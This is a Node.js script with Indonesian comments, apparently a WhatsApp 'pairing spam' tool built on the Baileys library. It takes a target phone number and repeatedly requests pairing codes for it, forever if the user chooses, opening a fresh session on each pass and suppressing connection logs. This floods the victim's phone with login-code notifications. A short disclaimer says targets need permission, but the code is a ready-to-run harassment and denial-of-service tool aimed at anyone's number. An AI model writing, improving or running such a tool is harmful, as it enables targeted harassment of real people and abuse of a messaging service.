// wa pairing spam — loop request pairing code, tiap iterasi fresh socket
// target harus nomor yang lo punya akses / punya izin.
// abuse = tanggung jawab lo, bukan bench.

import makeWASocket, { useMultiFileAuthState, Browsers } from '@whiskeysockets/baileys'
import { mkdirSync, rmSync } from 'fs'
import readline from 'readline/promises'

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })

// suppress log internal baileys biar layar bersih
const origLog = console.log
console.log = (...a) => {
    const s = a.map(String).join(' ')
    if (s.includes('Closing') || s.includes('Connection')) return
    origLog(...a)
}

async function fetchPairingCode(phone) {
    const sessionDir = `./auth_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
    mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: Browsers.ubuntu('Chrome'),
        syncFullHistory: false,
        markOnlineOnConnect: false,
        defaultQueryTimeoutMs: 30000,
    })

    sock.ev.on('creds.update', saveCreds)

    let code
    try {
        code = await sock.requestPairingCode(phone)
    } finally {
        try { sock.end(undefined) } catch {}
        await new Promise(r => setTimeout(r, 300))
        try { rmSync(sessionDir, { recursive: true, force: true }) } catch {}
    }
    return code
}

async function main() {
    console.log('\n=== WA Pairing Spam — ollie build ===\n')

    const phone = (await rl.question('Nomor target (digit only, contoh 6281234567890): ')).trim()
    if (!/^\d{8,15}$/.test(phone)) {
        console.log('[!] Nomor harus digit aja, ada country code (62 buat indo)')
        process.exit(1)
    }

    const countStr = (await rl.question('Jumlah percobaan (0 = infinite): ')).trim()
    const count = parseInt(countStr, 10) || 0

    const delayStr = (await rl.question('Delay antar request ms (default 3000): ')).trim()
    const delay = parseInt(delayStr, 10) || 3000

    console.log(`\n[*] target  : +${phone}`)
    console.log(`[*] jumlah  : ${count === 0 ? 'infinite' : count}`)
    console.log(`[*] delay   : ${delay}ms`)
    console.log(`[*] mulai...\n`)

    let i = 0
    let ok = 0
    let err = 0

    while (true) {
        i++
        if (count > 0 && i > count) break

        const ts = new Date().toLocaleTimeString()
        try {
            const code = await fetchPairingCode(phone)
            if (!code) throw new Error('empty code')
            ok++
            console.log(`[${ts}] #${i} ok    code: ${code}   (ok=${ok} err=${err})`)
        } catch (e) {
            err++
            const msg = (e && e.message ? e.message : 'unknown').split('\n')[0].slice(0, 120)
            console.log(`[${ts}] #${i} error ${msg}   (ok=${ok} err=${err})`)
        }

        if (count > 0 && i >= count) break
        await new Promise(r => setTimeout(r, delay))
    }

    console.log(`\n[!] selesai. ok=${ok} err=${err}`)
    rl.close()
    process.exit(0)
}

main().catch(e => {
    console.error('[!] fatal:', e)
    process.exit(1)
})